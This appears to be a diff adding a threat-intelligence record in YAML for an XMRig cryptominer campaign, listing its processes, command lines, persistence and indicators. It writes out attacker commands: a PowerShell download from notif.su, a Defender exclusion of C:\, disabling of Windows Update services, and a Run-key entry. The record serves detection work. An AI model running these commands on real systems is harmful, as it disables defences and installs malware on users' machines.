@@ -1,0 +1,66 @@
+description: "A multi\u2011staged XMRig cryptominer that uses LOLBAS techniques, PowerShell\
+  \ downloads, and scheduled task persistence."
+attribution: Unknown threat actor; activity linked to the US
+malware_families:
+- XMRig
+TTPs:
+  processes:
+  - svchost.exe
+  - cmd.exe
+  - powershell.exe
+  - miner.exe
+  - dvrctxctzmmr.exe
+  - djhtniluoblq.sys
+  commandline:
+  - cmd.exe /c "1.cmd"
+  - powershell.exe -WindowStyle Hidden -File S2.bat
+  - net stop Wuauserv
+  - sc config Wuauserv start= disabled
+  - net stop BITS
+  - sc config BITS start= disabled
+  - net stop UsoSvc
+  - sc config UsoSvc start= disabled
+  - net stop DoSvc
+  - sc config DoSvc start= disabled
+  - net stop WaaSMedicSvc
+  - sc config WaaSMedicSvc start= disabled
+  - net stop TrustedInstaller
+  - sc config TrustedInstaller start= disabled
+  powershell:
+  - Invoke-WebRequest -Uri https://notif.su/S2.bat -OutFile C:\Temp\S2.bat
+  - Add-MpPreference -ExclusionPath C:\
+  - Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name
+    DJKONTAH -Value "C:\\AppData\\frxpfpjpzvub\\dvrctxctzmmr.exe"
+  scripting_engine: []
+  registry_keys:
+  - HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\DJKONTAH
+  image_load: []
+  network_connections:
+  - process: cmd.exe
+    destination: notif.su
+    port: 80
+  - process: powershell.exe
+    destination: notif.su
+    port: 80
+  file_activity:
+  - C:\\Temp\\S2.bat
+  - '%APPDATA%\\Temp\\check.txt'
+  - C:\\AppData\\frxpfpjpzvub\\dvrctxctzmmr.exe
+  - '%TEMP%\\djhtniluoblq.sys'
+  persistence:
+  - Scheduled Task: RunS2BatchScript
+  - Registry Run Key: DJKONTAH
+  process_relations: []
+IOCs:
+  domains:
+  - notif.su
+  files:
+  - dvrctxctzmmr.exe
+  - djhtniluoblq.sys
+authors:
+- Sean Cartagena
+- Josemaria Grana
+- Andrew Go
+reference: https://www.gdatasoftware.com/blog/2025/07/38228-monero-malware-xmrig-resurgence
+date_of_publication: July 07, 2025
+file_creation_date: August 26, 2025
